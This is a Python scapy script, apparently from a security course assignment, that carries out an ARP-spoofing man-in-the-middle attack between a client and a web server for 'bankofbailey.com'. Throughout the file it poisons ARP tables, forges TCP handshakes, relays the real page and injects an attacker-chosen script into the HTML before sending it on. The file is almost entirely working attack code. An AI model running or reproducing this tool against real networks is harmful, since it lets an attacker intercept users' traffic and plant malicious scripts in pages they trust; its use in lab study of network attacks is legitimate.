# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time
import requests

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('# {0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Sends an ARP request to the IP address and returns a list of tuples containing the sent and received packets.
    reply = arping(IP, timeout = 5)

    # Extract the mac address (hwsrc -> source hardware request).
    # arping returns 2 lists. A list of answer packets and unanswered packets (so a tuple of two lists). Each element
    # in this list is a tuple of 2 elements (sent packet, recieved packet). 
    # So reply[0][0][1] returns the ARP reply packet of the first device that replied. 
    mac = reply[0][0][1].getlayer(ARP).hwsrc
    # debug(IP + " => " + mac)
    return mac

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script

    # Don't do anything for attacker's own packets
    if Ether in packet and packet[Ether].src == attackerMAC:
        return

    # Forward traffic from client to server
    if IP in packet and packet[IP].dst == serverIP:
        # Create packet with the attacker as the source and the client as the destination
        eth = Ether(src = attackerMAC, dst = clientMAC)
        ip = IP(dst = clientIP, src = serverIP)

        # Send SYN-ACK packet
        if TCP in packet and packet[TCP].flags == "S":
            tcp = TCP(flags = "SA", ack = packet[TCP].seq + 1, seq = 0, sport = 80, dport = packet[TCP].sport)
            syn_ack_packet = eth / ip / tcp
            sendp(syn_ack_packet)

        if Raw in packet and "Host: www.bankofbailey.com" in packet[Raw].load.decode():
            # Create ACK packet
            tcp = TCP(flags = "A", ack = packet[TCP].seq + len(packet[Raw].load.decode()), seq = packet[TCP].ack, sport = 80, dport = packet[TCP].sport)
            ack_packet = eth / ip / tcp
            
            # Get request path and send GET request to server
            request = packet[Raw].load.decode()
            request_headers = request.split("\r\n")
            request_path = request_headers[0].split(" ")[1]
            response = requests.get("http://www.bankofbailey.com" + request_path)
            
            payload = "HTTP/1.1 200 OK\r\n"
            for key in response.headers:
                payload = payload + key + ": " + response.headers[key] + "\r\n"
            payload = payload + "\r\n" + response.text
            
            # send ACK for GET REQUEST
            sendp(ack_packet)

            # Inserting the script
            new_payload = payload
            extra_length = 0
            new_payload, extra_length = payload.replace("</body>", "<script>{}</script></body>".format(script)), len("<script>{}</script>".format(script))
            html = new_payload.split("\r\n\r\n")
            headers = html[0].split("\r\n")
            
            for header in headers:
                if "Content-Length: " in header:
                    curr_len = int(header.split(": ")[1])
                    newContentLength = str(curr_len + extra_length)
                    newHead = header.replace(str(curr_len), newContentLength)
                    new_payload = new_payload.replace(header, newHead)
                    break
            
            response_length = len(new_payload.encode())
            bytes_sent = 0

            while response_length > 0:
                loadToSend = ""
                if response_length < 1446:
                    loadToSend = new_payload[bytes_sent : bytes_sent + response_length]
                    tcp = TCP(sport = 80, dport = packet[TCP].sport, flags = "PA", ack = packet[TCP].seq + len(packet[Raw].load.decode()), seq = packet[TCP].ack + bytes_sent) / Raw(load = loadToSend.encode())
                    bytes_sent += response_length
                else:
                    loadToSend = new_payload[bytes_sent : bytes_sent + 1446]
                    tcp = TCP(sport = 80, dport = packet[TCP].sport, flags = "PA", ack = packet[TCP].seq + len(packet[Raw].load.decode()), seq = packet[TCP].ack + bytes_sent) / Raw(load = loadToSend.encode())
                    bytes_sent += 1446

                response_length = response_length - 1446
                packet = eth / ip / tcp
                sendp(packet)
                time.sleep(0.1)

        if TCP in packet and packet[TCP].flags == "FA":
            tcp = TCP(sport = 80, dport = packet[TCP].sport, ack = packet[TCP].seq + 1, seq = packet[TCP].ack, flags = "FA")
            fin_ack_packet = eth / ip / tcp
            sendp(fin_ack_packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = args.script

    print("=" * 30 + " STARTING " + "=" * 30)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor, 'filter':"src host {}".format(clientIP)}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
